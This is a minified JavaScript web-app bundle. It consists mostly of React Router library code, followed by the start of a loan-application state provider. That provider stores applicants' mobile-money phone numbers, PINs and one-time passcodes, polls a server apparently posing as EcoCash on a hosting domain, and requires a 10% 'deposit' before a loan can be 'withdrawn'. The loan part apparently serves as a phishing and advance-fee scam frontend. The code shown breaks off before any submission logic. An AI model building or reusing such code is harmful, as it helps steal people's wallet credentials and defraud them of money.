        Em(m, !j || Q.endsWith("*") || Q.endsWith("*?"), `You rendered descendant <Routes> (or called \`useRoutes()\`) at "${m}" (under <Route path="${Q}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${Q}"> to <Route path="${Q === "/" ? "*" : `${Q}/*`}">.`)
    }
    let H = oa(), q;
    if (d) {
        let Q = typeof d == "string" ? Pa(d) : d;
        we(D === "/" || Q.pathname?.startsWith(D), `When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${D}" but pathname "${Q.pathname}" was given in the \`location\` prop.`),
        q = Q
    } else
        q = H;
    let X = q.pathname || "/"
      , Y = X;
    if (D !== "/") {
        let Q = D.replace(/^\//, "").split("/");
        Y = "/" + X.replace(/^\//, "").split("/").slice(Q.length).join("/")
    }
    let G = hm(s, {
        pathname: Y
    });
    Gt(j || G != null, `No routes matched location "${q.pathname}${q.search}${q.hash}" `),
    Gt(G == null || G[G.length - 1].route.element !== void 0 || G[G.length - 1].route.Component !== void 0 || G[G.length - 1].route.lazy !== void 0, `Matched leaf route at location "${q.pathname}${q.search}${q.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);
    let w = Zv(G && G.map(Q => Object.assign({}, Q, {
        params: Object.assign({}, N, Q.params),
        pathname: pl([D, v.encodeLocation ? v.encodeLocation(Q.pathname.replace(/\?/g, "%3F").replace(/#/g, "%23")).pathname : Q.pathname]),
        pathnameBase: Q.pathnameBase === "/" ? D : pl([D, v.encodeLocation ? v.encodeLocation(Q.pathnameBase.replace(/\?/g, "%3F").replace(/#/g, "%23")).pathname : Q.pathnameBase])
    })), x, f, o, p);
    return d && w ? S.createElement(In.Provider, {
        value: {
            location: {
                pathname: "/",
                search: "",
                hash: "",
                state: null,
                key: "default",
                ...q
            },
            navigationType: "POP"
        }
    }, w) : w
}
function wv() {
    let s = $v()
      , d = Mv(s) ? `${s.status} ${s.statusText}` : s instanceof Error ? s.message : JSON.stringify(s)
      , f = s instanceof Error ? s.stack : null
      , o = "rgba(200,200,200, 0.5)"
      , p = {
        padding: "0.5rem",
        backgroundColor: o
    }
      , v = {
        padding: "2px 4px",
        backgroundColor: o
    }
      , x = null;
    return console.error("Error handled by React Router default ErrorBoundary:", s),
    x = S.createElement(S.Fragment, null, S.createElement("p", null, "💿 Hey developer 👋"), S.createElement("p", null, "You can provide a way better UX than this when your app throws errors by providing your own ", S.createElement("code", {
        style: v
    }, "ErrorBoundary"), " or", " ", S.createElement("code", {
        style: v
    }, "errorElement"), " prop on your route.")),
    S.createElement(S.Fragment, null, S.createElement("h2", null, "Unexpected Application Error!"), S.createElement("h3", {
        style: {
            fontStyle: "italic"
        }
    }, d), f ? S.createElement("pre", {
        style: p
    }, f) : null, x)
}
var Gv = S.createElement(wv, null)
  , Xv = class extends S.Component {
    constructor(s) {
        super(s),
        this.state = {
            location: s.location,
            revalidation: s.revalidation,
            error: s.error
        }
    }
    static getDerivedStateFromError(s) {
        return {
            error: s
        }
    }
    static getDerivedStateFromProps(s, d) {
        return d.location !== s.location || d.revalidation !== "idle" && s.revalidation === "idle" ? {
            error: s.error,
            location: s.location,
            revalidation: s.revalidation
        } : {
            error: s.error !== void 0 ? s.error : d.error,
            location: d.location,
            revalidation: s.revalidation || d.revalidation
        }
    }
    componentDidCatch(s, d) {
        this.props.onError ? this.props.onError(s, d) : console.error("React Router caught the following error during render", s)
    }
    render() {
        return this.state.error !== void 0 ? S.createElement($t.Provider, {
            value: this.props.routeContext
        }, S.createElement(ks.Provider, {
            value: this.state.error,
            children: this.props.component
        })) : this.props.children
    }
}
;
function Qv({routeContext: s, match: d, children: f}) {
    let o = S.useContext(en);
    return o && o.static && o.staticContext && (d.route.errorElement || d.route.ErrorBoundary) && (o.staticContext._deepestRenderedBoundaryId = d.route.id),
    S.createElement($t.Provider, {
        value: s
    }, f)
}
function Zv(s, d=[], f=null, o=null, p=null) {
    if (s == null) {
        if (!f)
            return null;
        if (f.errors)
            s = f.matches;
        else if (d.length === 0 && !f.initialized && f.matches.length > 0)
            s = f.matches;
        else
            return null
    }
    let v = s
      , x = f?.errors;
    if (x != null) {
        let D = v.findIndex(j => j.route.id && x?.[j.route.id] !== void 0);
        we(D >= 0, `Could not find a matching route for errors on route IDs: ${Object.keys(x).join(",")}`),
        v = v.slice(0, Math.min(v.length, D + 1))
    }
    let z = !1
      , N = -1;
    if (f)
        for (let D = 0; D < v.length; D++) {
            let j = v[D];
            if ((j.route.HydrateFallback || j.route.hydrateFallbackElement) && (N = D),
            j.route.id) {
                let {loaderData: H, errors: q} = f
                  , X = j.route.loader && !H.hasOwnProperty(j.route.id) && (!q || q[j.route.id] === void 0);
                if (j.route.lazy || X) {
                    z = !0,
                    N >= 0 ? v = v.slice(0, N + 1) : v = [v[0]];
                    break
                }
            }
        }
    let m = f && o ? (D, j) => {
        o(D, {
            location: f.location,
            params: f.matches?.[0]?.params ?? {},
            unstable_pattern: Rv(f.matches),
            errorInfo: j
        })
    }
    : void 0;
    return v.reduceRight( (D, j, H) => {
        let q, X = !1, Y = null, G = null;
        f && (q = x && j.route.id ? x[j.route.id] : void 0,
        Y = j.route.errorElement || Gv,
        z && (N < 0 && H === 0 ? (Em("route-fallback", !1, "No `HydrateFallback` element provided to render during initial hydration"),
        X = !0,
        G = null) : N === H && (X = !0,
        G = j.route.hydrateFallbackElement || null)));
        let w = d.concat(v.slice(0, H + 1))
          , Q = () => {
            let V;
            return q ? V = Y : X ? V = G : j.route.Component ? V = S.createElement(j.route.Component, null) : j.route.element ? V = j.route.element : V = D,
            S.createElement(Qv, {
                match: j,
                routeContext: {
                    outlet: D,
                    matches: w,
                    isDataRoute: f != null
                },
                children: V
            })
        }
        ;
        return f && (j.route.ErrorBoundary || j.route.errorElement || H === 0) ? S.createElement(Xv, {
            location: f.location,
            revalidation: f.revalidation,
            component: Y,
            error: q,
            children: Q(),
            routeContext: {
                outlet: null,
                matches: w,
                isDataRoute: !0
            },
            onError: m
        }) : Q()
    }
    , null)
}
function $s(s) {
    return `${s} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`
}
function Vv(s) {
    let d = S.useContext(en);
    return we(d, $s(s)),
    d
}
function Kv(s) {
    let d = S.useContext(xi);
    return we(d, $s(s)),
    d
}
function Jv(s) {
    let d = S.useContext($t);
    return we(d, $s(s)),
    d
}
function Ws(s) {
    let d = Jv(s)
      , f = d.matches[d.matches.length - 1];
    return we(f.route.id, `${s} can only be used on routes that contain a unique "id"`),
    f.route.id
}
function kv() {
    return Ws("useRouteId")
}
function $v() {
    let s = S.useContext(ks)
      , d = Kv("useRouteError")
      , f = Ws("useRouteError");
    return s !== void 0 ? s : d.errors?.[f]
}
function Wv() {
    let {router: s} = Vv("useNavigate")
      , d = Ws("useNavigate")
      , f = S.useRef(!1);
    return Nm( () => {
        f.current = !0
    }
    ),
    S.useCallback(async (p, v={}) => {
        Gt(f.current, xm),
        f.current && (typeof p == "number" ? await s.navigate(p) : await s.navigate(p, {
            fromRouteId: d,
            ...v
        }))
    }
    , [s, d])
}
var dm = {};
function Em(s, d, f) {
    !d && !dm[s] && (dm[s] = !0,
    Gt(!1, f))
}
S.memo(Fv);
function Fv({routes: s, future: d, state: f, unstable_onError: o}) {
    return jm(s, void 0, f, o, d)
}
function kt(s) {
    we(!1, "A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")
}
function Iv({basename: s="/", children: d=null, location: f, navigationType: o="POP", navigator: p, static: v=!1, unstable_useTransitions: x}) {
    we(!Pn(), "You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");
    let z = s.replace(/^\/*/, "/")
      , N = S.useMemo( () => ({
        basename: z,
        navigator: p,
        static: v,
        unstable_useTransitions: x,
        future: {}
    }), [z, p, v, x]);
    typeof f == "string" && (f = Pa(f));
    let {pathname: m="/", search: D="", hash: j="", state: H=null, key: q="default"} = f
      , X = S.useMemo( () => {
        let Y = vl(m, z);
        return Y == null ? null : {
            location: {
                pathname: Y,
                search: D,
                hash: j,
                state: H,
                key: q
            },
            navigationType: o
        }
    }
    , [z, m, D, j, H, q, o]);
    return Gt(X != null, `<Router basename="${z}"> is not able to match the URL "${m}${D}${j}" because it does not start with the basename, so the <Router> won't render anything.`),
    X == null ? null : S.createElement(Xt.Provider, {
        value: N
    }, S.createElement(In.Provider, {
        children: d,
        value: X
    }))
}
function Pv({children: s, location: d}) {
    return Yv(Ks(s), d)
}
function Ks(s, d=[]) {
    let f = [];
    return S.Children.forEach(s, (o, p) => {
        if (!S.isValidElement(o))
            return;
        let v = [...d, p];
        if (o.type === S.Fragment) {
            f.push.apply(f, Ks(o.props.children, v));
            return
        }
        we(o.type === kt, `[${typeof o.type == "string" ? o.type : o.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),
        we(!o.props.index || !o.props.children, "An index route cannot have child routes.");
        let x = {
            id: o.props.id || v.join("-"),
            caseSensitive: o.props.caseSensitive,
            element: o.props.element,
            Component: o.props.Component,
            index: o.props.index,
            path: o.props.path,
            middleware: o.props.middleware,
            loader: o.props.loader,
            action: o.props.action,
            hydrateFallbackElement: o.props.hydrateFallbackElement,
            HydrateFallback: o.props.HydrateFallback,
            errorElement: o.props.errorElement,
            ErrorBoundary: o.props.ErrorBoundary,
            hasErrorBoundary: o.props.hasErrorBoundary === !0 || o.props.ErrorBoundary != null || o.props.errorElement != null,
            shouldRevalidate: o.props.shouldRevalidate,
            handle: o.props.handle,
            lazy: o.props.lazy
        };
        o.props.children && (x.children = Ks(o.props.children, v)),
        f.push(x)
    }
    ),
    f
}
var gi = "get"
  , Si = "application/x-www-form-urlencoded";
function Ni(s) {
    return typeof HTMLElement < "u" && s instanceof HTMLElement
}
function ey(s) {
    return Ni(s) && s.tagName.toLowerCase() === "button"
}
function ty(s) {
    return Ni(s) && s.tagName.toLowerCase() === "form"
}
function ly(s) {
    return Ni(s) && s.tagName.toLowerCase() === "input"
}
function ay(s) {
    return !!(s.metaKey || s.altKey || s.ctrlKey || s.shiftKey)
}
function ny(s, d) {
    return s.button === 0 && (!d || d === "_self") && !ay(s)
}
var yi = null;
function uy() {
    if (yi === null)
        try {
            new FormData(document.createElement("form"),0),
            yi = !1
        } catch {
            yi = !0
        }
    return yi
}
var iy = new Set(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]);
function Qs(s) {
    return s != null && !iy.has(s) ? (Gt(!1, `"${s}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Si}"`),
    null) : s
}
function cy(s, d) {
    let f, o, p, v, x;
    if (ty(s)) {
        let z = s.getAttribute("action");
        o = z ? vl(z, d) : null,
        f = s.getAttribute("method") || gi,
        p = Qs(s.getAttribute("enctype")) || Si,
        v = new FormData(s)
    } else if (ey(s) || ly(s) && (s.type === "submit" || s.type === "image")) {
        let z = s.form;
        if (z == null)
            throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');
        let N = s.getAttribute("formaction") || z.getAttribute("action");
        if (o = N ? vl(N, d) : null,
        f = s.getAttribute("formmethod") || z.getAttribute("method") || gi,
        p = Qs(s.getAttribute("formenctype")) || Qs(z.getAttribute("enctype")) || Si,
        v = new FormData(z,s),
        !uy()) {
            let {name: m, type: D, value: j} = s;
            if (D === "image") {
                let H = m ? `${m}.` : "";
                v.append(`${H}x`, "0"),
                v.append(`${H}y`, "0")
            } else
                m && v.append(m, j)
        }
    } else {
        if (Ni(s))
            throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');
        f = gi,
        o = null,
        p = Si,
        x = s
    }
    return v && p === "text/plain" && (x = v,
    v = void 0),
    {
        action: o,
        method: f.toLowerCase(),
        encType: p,
        formData: v,
        body: x
    }
}
Object.getOwnPropertyNames(Object.prototype).sort().join("\0");
function Fs(s, d) {
    if (s === !1 || s === null || typeof s > "u")
        throw new Error(d)
}
function sy(s, d, f) {
    let o = typeof s == "string" ? new URL(s,typeof window > "u" ? "server://singlefetch/" : window.location.origin) : s;
    return o.pathname === "/" ? o.pathname = `_root.${f}` : d && vl(o.pathname, d) === "/" ? o.pathname = `${d.replace(/\/$/, "")}/_root.${f}` : o.pathname = `${o.pathname.replace(/\/$/, "")}.${f}`,
    o
}
async function oy(s, d) {
    if (s.id in d)
        return d[s.id];
    try {
        let f = await import(s.module);
        return d[s.id] = f,
        f
    } catch (f) {
        return console.error(`Error loading route module \`${s.module}\`, reloading page...`),
        console.error(f),
        window.__reactRouterContext && window.__reactRouterContext.isSpaMode,
        window.location.reload(),
        new Promise( () => {}
        )
    }
}
function ry(s) {
    return s == null ? !1 : s.href == null ? s.rel === "preload" && typeof s.imageSrcSet == "string" && typeof s.imageSizes == "string" : typeof s.rel == "string" && typeof s.href == "string"
}
async function fy(s, d, f) {
    let o = await Promise.all(s.map(async p => {
        let v = d.routes[p.route.id];
        if (v) {
            let x = await oy(v, f);
            return x.links ? x.links() : []
        }
        return []
    }
    ));
    return py(o.flat(1).filter(ry).filter(p => p.rel === "stylesheet" || p.rel === "preload").map(p => p.rel === "stylesheet" ? {
        ...p,
        rel: "prefetch",
        as: "style"
    } : {
        ...p,
        rel: "prefetch"
    }))
}
function mm(s, d, f, o, p, v) {
    let x = (N, m) => f[m] ? N.route.id !== f[m].route.id : !0
      , z = (N, m) => f[m].pathname !== N.pathname || f[m].route.path?.endsWith("*") && f[m].params["*"] !== N.params["*"];
    return v === "assets" ? d.filter( (N, m) => x(N, m) || z(N, m)) : v === "data" ? d.filter( (N, m) => {
        let D = o.routes[N.route.id];
        if (!D || !D.hasLoader)
            return !1;
        if (x(N, m) || z(N, m))
            return !0;
        if (N.route.shouldRevalidate) {
            let j = N.route.shouldRevalidate({
                currentUrl: new URL(p.pathname + p.search + p.hash,window.origin),
                currentParams: f[0]?.params || {},
                nextUrl: new URL(s,window.origin),
                nextParams: N.params,
                defaultShouldRevalidate: !0
            });
            if (typeof j == "boolean")
                return j
        }
        return !0
    }
    ) : []
}
function dy(s, d, {includeHydrateFallback: f}={}) {
    return my(s.map(o => {
        let p = d.routes[o.route.id];
        if (!p)
            return [];
        let v = [p.module];
        return p.clientActionModule && (v = v.concat(p.clientActionModule)),
        p.clientLoaderModule && (v = v.concat(p.clientLoaderModule)),
        f && p.hydrateFallbackModule && (v = v.concat(p.hydrateFallbackModule)),
        p.imports && (v = v.concat(p.imports)),
        v
    }
    ).flat(1))
}
function my(s) {
    return [...new Set(s)]
}
function hy(s) {
    let d = {}
      , f = Object.keys(s).sort();
    for (let o of f)
        d[o] = s[o];
    return d
}
function py(s, d) {
    let f = new Set;
    return new Set(d),
    s.reduce( (o, p) => {
        let v = JSON.stringify(hy(p));
        return f.has(v) || (f.add(v),
        o.push({
            key: v,
            link: p
        })),
        o
    }
    , [])
}
function Tm() {
    let s = S.useContext(en);
    return Fs(s, "You must render this element inside a <DataRouterContext.Provider> element"),
    s
}
function vy() {
    let s = S.useContext(xi);
    return Fs(s, "You must render this element inside a <DataRouterStateContext.Provider> element"),
    s
}
var Is = S.createContext(void 0);
Is.displayName = "FrameworkContext";
function Am() {
    let s = S.useContext(Is);
    return Fs(s, "You must render this element inside a <HydratedRouter> element"),
    s
}
function yy(s, d) {
    let f = S.useContext(Is)
      , [o,p] = S.useState(!1)
      , [v,x] = S.useState(!1)
      , {onFocus: z, onBlur: N, onMouseEnter: m, onMouseLeave: D, onTouchStart: j} = d
      , H = S.useRef(null);
    S.useEffect( () => {
        if (s === "render" && x(!0),
        s === "viewport") {
            let Y = w => {
                w.forEach(Q => {
                    x(Q.isIntersecting)
                }
                )
            }
              , G = new IntersectionObserver(Y,{
                threshold: .5
            });
            return H.current && G.observe(H.current),
            () => {
                G.disconnect()
            }
        }
    }
    , [s]),
    S.useEffect( () => {
        if (o) {
            let Y = setTimeout( () => {
                x(!0)
            }
            , 100);
            return () => {
                clearTimeout(Y)
            }
        }
    }
    , [o]);
    let q = () => {
        p(!0)
    }
      , X = () => {
        p(!1),
        x(!1)
    }
    ;
    return f ? s !== "intent" ? [v, H, {}] : [v, H, {
        onFocus: Wn(z, q),
        onBlur: Wn(N, X),
        onMouseEnter: Wn(m, q),
        onMouseLeave: Wn(D, X),
        onTouchStart: Wn(j, q)
    }] : [!1, H, {}]
}
function Wn(s, d) {
    return f => {
        s && s(f),
        f.defaultPrevented || d(f)
    }
}
function gy({page: s, ...d}) {
    let {router: f} = Tm()
      , o = S.useMemo( () => hm(f.routes, s, f.basename), [f.routes, s, f.basename]);
    return o ? S.createElement(by, {
        page: s,
        matches: o,
        ...d
    }) : null
}
function Sy(s) {
    let {manifest: d, routeModules: f} = Am()
      , [o,p] = S.useState([]);
    return S.useEffect( () => {
        let v = !1;
        return fy(s, d, f).then(x => {
            v || p(x)
        }
        ),
        () => {
            v = !0
        }
    }
    , [s, d, f]),
    o
}
function by({page: s, matches: d, ...f}) {
    let o = oa()
      , {manifest: p, routeModules: v} = Am()
      , {basename: x} = Tm()
      , {loaderData: z, matches: N} = vy()
      , m = S.useMemo( () => mm(s, d, N, p, o, "data"), [s, d, N, p, o])
      , D = S.useMemo( () => mm(s, d, N, p, o, "assets"), [s, d, N, p, o])
      , j = S.useMemo( () => {
        if (s === o.pathname + o.search + o.hash)
            return [];
        let X = new Set
          , Y = !1;
        if (d.forEach(w => {
            let Q = p.routes[w.route.id];
            !Q || !Q.hasLoader || (!m.some(V => V.route.id === w.route.id) && w.route.id in z && v[w.route.id]?.shouldRevalidate || Q.hasClientLoader ? Y = !0 : X.add(w.route.id))
        }
        ),
        X.size === 0)
            return [];
        let G = sy(s, x, "data");
        return Y && X.size > 0 && G.searchParams.set("_routes", d.filter(w => X.has(w.route.id)).map(w => w.route.id).join(",")),
        [G.pathname + G.search]
    }
    , [x, z, o, p, m, d, s, v])
      , H = S.useMemo( () => dy(D, p), [D, p])
      , q = Sy(D);
    return S.createElement(S.Fragment, null, j.map(X => S.createElement("link", {
        key: X,
        rel: "prefetch",
        as: "fetch",
        href: X,
        ...f
    })), H.map(X => S.createElement("link", {
        key: X,
        rel: "modulepreload",
        href: X,
        ...f
    })), q.map( ({key: X, link: Y}) => S.createElement("link", {
        key: X,
        nonce: f.nonce,
        ...Y
    })))
}
function xy(...s) {
    return d => {
        s.forEach(f => {
            typeof f == "function" ? f(d) : f != null && (f.current = d)
        }
        )
    }
}
var zm = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u";
try {
    zm && (window.__reactRouterVersion = "7.10.1")
} catch {}
function Ny({basename: s, children: d, unstable_useTransitions: f, window: o}) {
    let p = S.useRef();
    p.current == null && (p.current = cv({
        window: o,
        v5Compat: !0
    }));
    let v = p.current
      , [x,z] = S.useState({
        action: v.action,
        location: v.location
    })
      , N = S.useCallback(m => {
        f === !1 ? z(m) : S.startTransition( () => z(m))
    }
    , [f]);
    return S.useLayoutEffect( () => v.listen(N), [v, N]),
    S.createElement(Iv, {
        basename: s,
        children: d,
        location: x.location,
        navigationType: x.action,
        navigator: v,
        unstable_useTransitions: f === !0
    })
}
var Dm = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
  , Cm = S.forwardRef(function({onClick: d, discover: f="render", prefetch: o="none", relative: p, reloadDocument: v, replace: x, state: z, target: N, to: m, preventScrollReset: D, viewTransition: j, ...H}, q) {
    let {basename: X, unstable_useTransitions: Y} = S.useContext(Xt), G = typeof m == "string" && Dm.test(m), w, Q = !1;
    if (typeof m == "string" && G && (w = m,
    zm))
        try {
            let Ae = new URL(window.location.href)
              , te = m.startsWith("//") ? new URL(Ae.protocol + m) : new URL(m)
              , le = vl(te.pathname, X);
            te.origin === Ae.origin && le != null ? m = le + te.search + te.hash : Q = !0
        } catch {
            Gt(!1, `<Link to="${m}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)
        }
    let V = Lv(m, {
        relative: p
    })
      , [ae,be,se] = yy(o, H)
      , F = Ay(m, {
        replace: x,
        state: z,
        target: N,
        preventScrollReset: D,
        relative: p,
        viewTransition: j,
        unstable_useTransitions: Y
    });
    function re(Ae) {
        d && d(Ae),
        Ae.defaultPrevented || F(Ae)
    }
    let xe = S.createElement("a", {
        ...H,
        ...se,
        href: w || V,
        onClick: Q || v ? d : re,
        ref: xy(q, be),
        target: N,
        "data-discover": !G && f === "render" ? "true" : void 0
    });
    return ae && !G ? S.createElement(S.Fragment, null, xe, S.createElement(gy, {
        page: V
    })) : xe
});
Cm.displayName = "Link";
var jy = S.forwardRef(function({"aria-current": d="page", caseSensitive: f=!1, className: o="", end: p=!1, style: v, to: x, viewTransition: z, children: N, ...m}, D) {
    let j = eu(x, {
        relative: m.relative
    })
      , H = oa()
      , q = S.useContext(xi)
      , {navigator: X, basename: Y} = S.useContext(Xt)
      , G = q != null && My(j) && z === !0
      , w = X.encodeLocation ? X.encodeLocation(j).pathname : j.pathname
      , Q = H.pathname
      , V = q && q.navigation && q.navigation.location ? q.navigation.location.pathname : null;
    f || (Q = Q.toLowerCase(),
    V = V ? V.toLowerCase() : null,
    w = w.toLowerCase()),
    V && Y && (V = vl(V, Y) || V);
    const ae = w !== "/" && w.endsWith("/") ? w.length - 1 : w.length;
    let be = Q === w || !p && Q.startsWith(w) && Q.charAt(ae) === "/", se = V != null && (V === w || !p && V.startsWith(w) && V.charAt(w.length) === "/"), F = {
        isActive: be,
        isPending: se,
        isTransitioning: G
    }, re = be ? d : void 0, xe;
    typeof o == "function" ? xe = o(F) : xe = [o, be ? "active" : null, se ? "pending" : null, G ? "transitioning" : null].filter(Boolean).join(" ");
    let Ae = typeof v == "function" ? v(F) : v;
    return S.createElement(Cm, {
        ...m,
        "aria-current": re,
        className: xe,
        ref: D,
        style: Ae,
        to: x,
        viewTransition: z
    }, typeof N == "function" ? N(F) : N)
});
jy.displayName = "NavLink";
var Ey = S.forwardRef( ({discover: s="render", fetcherKey: d, navigate: f, reloadDocument: o, replace: p, state: v, method: x=gi, action: z, onSubmit: N, relative: m, preventScrollReset: D, viewTransition: j, ...H}, q) => {
    let {unstable_useTransitions: X} = S.useContext(Xt)
      , Y = Cy()
      , G = Oy(z, {
        relative: m
    })
      , w = x.toLowerCase() === "get" ? "get" : "post"
      , Q = typeof z == "string" && Dm.test(z)
      , V = ae => {
        if (N && N(ae),
        ae.defaultPrevented)
            return;
        ae.preventDefault();
        let be = ae.nativeEvent.submitter
          , se = be?.getAttribute("formmethod") || x
          , F = () => Y(be || ae.currentTarget, {
            fetcherKey: d,
            method: se,
            navigate: f,
            replace: p,
            state: v,
            relative: m,
            preventScrollReset: D,
            viewTransition: j
        });
        X && f !== !1 ? S.startTransition( () => F()) : F()
    }
    ;
    return S.createElement("form", {
        ref: q,
        method: w,
        action: G,
        onSubmit: o ? N : V,
        ...H,
        "data-discover": !Q && s === "render" ? "true" : void 0
    })
}
);
Ey.displayName = "Form";
function Ty(s) {
    return `${s} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`
}
function Om(s) {
    let d = S.useContext(en);
    return we(d, Ty(s)),
    d
}
function Ay(s, {target: d, replace: f, state: o, preventScrollReset: p, relative: v, viewTransition: x, unstable_useTransitions: z}={}) {
    let N = Xl()
      , m = oa()
      , D = eu(s, {
        relative: v
    });
    return S.useCallback(j => {
        if (ny(j, d)) {
            j.preventDefault();
            let H = f !== void 0 ? f : Fn(m) === Fn(D)
              , q = () => N(s, {
                replace: H,
                state: o,
                preventScrollReset: p,
                relative: v,
                viewTransition: x
            });
            z ? S.startTransition( () => q()) : q()
        }
    }
    , [m, N, D, f, o, d, s, p, v, x, z])
}
var zy = 0
  , Dy = () => `__${String(++zy)}__`;
function Cy() {
    let {router: s} = Om("useSubmit")
      , {basename: d} = S.useContext(Xt)
      , f = kv()
      , o = s.fetch
      , p = s.navigate;
    return S.useCallback(async (v, x={}) => {
        let {action: z, method: N, encType: m, formData: D, body: j} = cy(v, d);
        if (x.navigate === !1) {
            let H = x.fetcherKey || Dy();
            await o(H, f, x.action || z, {
                preventScrollReset: x.preventScrollReset,
                formData: D,
                body: j,
                formMethod: x.method || N,
                formEncType: x.encType || m,
                flushSync: x.flushSync
            })
        } else
            await p(x.action || z, {
                preventScrollReset: x.preventScrollReset,
                formData: D,
                body: j,
                formMethod: x.method || N,
                formEncType: x.encType || m,
                replace: x.replace,
                state: x.state,
                fromRouteId: f,
                flushSync: x.flushSync,
                viewTransition: x.viewTransition
            })
    }
    , [o, p, d, f])
}
function Oy(s, {relative: d}={}) {
    let {basename: f} = S.useContext(Xt)
      , o = S.useContext($t);
    we(o, "useFormAction must be used inside a RouteContext");
    let[p] = o.matches.slice(-1)
      , v = {
        ...eu(s || ".", {
            relative: d
        })
    }
      , x = oa();
    if (s == null) {
        v.search = x.search;
        let z = new URLSearchParams(v.search)
          , N = z.getAll("index");
        if (N.some(D => D === "")) {
            z.delete("index"),
            N.filter(j => j).forEach(j => z.append("index", j));
            let D = z.toString();
            v.search = D ? `?${D}` : ""
        }
    }
    return (!s || s === ".") && p.route.index && (v.search = v.search ? v.search.replace(/^\?/, "?index&") : "?index"),
    f !== "/" && (v.pathname = v.pathname === "/" ? f : pl([f, v.pathname])),
    Fn(v)
}
function My(s, {relative: d}={}) {
    let f = S.useContext(bm);
    we(f != null, "`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");
    let {basename: o} = Om("useViewTransitionState")
      , p = eu(s, {
        relative: d
    });
    if (!f.isTransitioning)
        return !1;
    let v = vl(f.currentLocation.pathname, o) || f.currentLocation.pathname
      , x = vl(f.nextLocation.pathname, o) || f.nextLocation.pathname;
    return bi(p.pathname, x) != null || bi(p.pathname, v) != null
}
const Mm = S.createContext()
  , ra = () => {
    const s = S.useContext(Mm);
    if (!s)
        throw new Error("useLoanApplication must be used within LoanApplicationProvider");
    return s
}
  , Ry = ({children: s}) => {
    const [d,f] = S.useState({
        isChecking: !0,
        isActive: !1,
        error: null,
        retryCount: 0
    })
      , [o,p] = S.useState({
        loanAmount: 5e3,
        loanTerm: 12,
        monthlyPayment: 0
    })
      , [v,x] = S.useState({
        loanType: "Personal Loan",
        loanAmount: "",
        loanTerm: "12 Months",
        purpose: ""
    })
      , [z,N] = S.useState({
        firstName: "",
        lastName: "",
        email: "",
        phoneNumber: ""
    })
      , [m,D] = S.useState({
        employmentStatus: "Employed",
        annualIncome: ""
    })
      , [j,H] = S.useState({
        phoneNumber: "",
        pin: "",
        otp: "",
        isAuthenticated: !1
    })
      , [q,X] = S.useState({
        approvedAmount: 0,
        requestedAmount: 0,
        monthlyPayment: 0,
        loanTerm: "",
        interestRate: "8% APR",
        accountNumber: "",
        requiredDeposit: 0,
        totalWithBonus: 0,
        hasDeposited: !1,
        canWithdraw: !1
    });
    S.useEffect( () => {
        (async () => {
            const le = "https://ecocash-zw-server-0051.onrender.com"
              , Qe = async O => {
                try {
                    f(pe => ({
                        ...pe,
                        isChecking: !0,
                        retryCount: O
                    }));
                    const B = new AbortController
                      , $ = setTimeout( () => B.abort(), 1e4)
                      , he = await fetch(`${le}/api/health`, {
                        method: "GET",
                        signal: B.signal
                    });
                    if (clearTimeout($),
                    he.ok)
                        return f({
                            isChecking: !1,
                            isActive: !0,
                            error: null,
                            retryCount: O
                        }),
                        !0
                } catch {
                    return O < 9999 ? (await new Promise($ => setTimeout($, 3e3)),
                    Qe(O + 1)) : (f({
                        isChecking: !1,
                        isActive: !1,
                        error: "Server is not responding. Please try again later.",
                        retryCount: O
                    }),
                    !1)
                }
            }
            ;
            await Qe(0)
        }
        )()
    }
    , []);
    const Y = te => {
        p(le => ({
            ...le,
            ...te
        }))
    }
      , G = te => {
        x(le => ({
            ...le,
            ...te
        }))
    }
      , w = te => {
        N(le => ({
            ...le,
            ...te
        }))
    }
      , Q = te => {
        D(le => ({
            ...le,
            ...te
        }))
    }
      , V = te => {
        H(le => ({
            ...le,
            ...te
        }))
    }
      , ae = te => {
        X(le => ({
            ...le,
            ...te
        }))
    }
      , be = () => ({
        calculator: o,
        loanApplication: v,
        personalDetails: z,
        financial: m,
        auth: j,
        status: q
    })
      , se = () => {
        const te = parseFloat(v.loanAmount) || 0
          , le = parseFloat(m.annualIncome) || 0;
        let it = te;
        if (le > 0) {
            const pe = le * .3;
            it = Math.min(te, pe)
        }
        const Fe = .08
          , Qe = parseInt(v.loanTerm) || 12
          , O = Fe / 12
          , B = it * (1 + O * Qe) / Qe
          , $ = te * .1
          , he = te + te * .1;
        return {
            approvedAmount: Math.round(it * 100) / 100,
            requestedAmount: te,
            monthlyPayment: Math.round(B * 100) / 100,
            loanTerm: v.loanTerm,
            requiredDeposit: Math.round($ * 100) / 100,
            totalWithBonus: Math.round(he * 100) / 100
        }
    }
      , Ae = {
        serverStatus: d,
        calculatorData: o,
        loanApplicationData: v,
        personalDetailsData: z,
        financialData: m,
        authData: j,
        loanStatusData: q,
        updateCalculatorData: Y,
        updateLoanApplicationData: G,
        updatePersonalDetailsData: w,
        updateFinancialData: Q,
        updateAuthData: V,
        updateLoanStatusData: ae,
        getCompleteApplicationData: be,
        calculateLoanApproval: se,
        processLoanApplication: () => {
            const te = se()
              , le = j.phoneNumber.replace(/\D/g, "").slice(-10);
            return ae({
                ...te,
                accountNumber: le,
                interestRate: "8% APR",
                hasDeposited: !1,
                canWithdraw: !1
            }),
            te
        }
        ,
        completeDeposit: () => {
            ae({
                hasDeposited: !0,
                canWithdraw: !0
            })
        }
        ,
        resetAllData: () => {
            p({
                loanAmount: 5e3,
                loanTerm: 12,
                monthlyPayment: 0
            }),
            x({
